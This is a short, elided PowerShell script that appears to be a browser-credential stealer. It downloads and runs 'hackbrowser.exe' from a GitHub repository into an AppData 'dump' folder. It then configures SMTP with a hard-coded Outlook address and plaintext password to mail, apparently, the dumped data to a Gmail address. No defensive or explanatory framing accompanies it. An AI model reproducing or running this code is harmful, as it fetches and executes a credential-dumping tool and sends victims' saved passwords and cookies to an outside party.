...
Invoke-WebRequest -Uri "https://github.com/SillySan/SillyRepository/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("sjsjsjshiba@outlook.com", "shibainu223");
$smtp.EnableSsl = $true
$Message.From = "sjsjsjshiba@outlook.com"
$Message.To.Add("sharkozlmao@gmail.com")
